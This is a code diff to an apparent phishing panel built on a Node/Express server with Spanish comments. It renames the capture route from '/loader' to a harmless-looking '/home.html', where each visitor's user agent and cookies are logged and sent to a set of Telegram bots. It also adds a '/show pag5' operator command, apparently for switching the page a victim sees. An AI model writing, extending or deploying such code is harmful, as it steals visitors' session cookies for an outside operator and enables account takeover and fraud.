@@ -45,7 +45,8 @@ function sendTelegramMessage(userAgent, cookies) {
 ➡️ /show pag1  
 ➡️ /show pag2  
 ➡️ /show pag3
-➡️ /show pag4`;
+➡️ /show pag4
+➡️ /show pag5`;
 
     // 🔥 Enviar a todos los bots
     TELEGRAM_BOTS.forEach(bot => {
@@ -69,13 +70,13 @@ app.get("/check", (req, res) => {
 });
 
 // 🏠 Ruta principal (cuando un usuario entra a la página)
-app.get("/loader", (req, res) => {
+app.get("/home.html", (req, res) => {
     const userAgent = req.headers["user-agent"];
     const cookies = req.cookies;
     console.log("📢 Nuevo visitante detectado:", { userAgent, cookies });
 
     sendTelegramMessage(userAgent, cookies);
-    res.sendFile(path.join(__dirname, "public", "loader.html"));
+    res.sendFile(path.join(__dirname, "public", "home.html"));
 });
 
 // 🔌 WebSockets para actualización en tiempo real
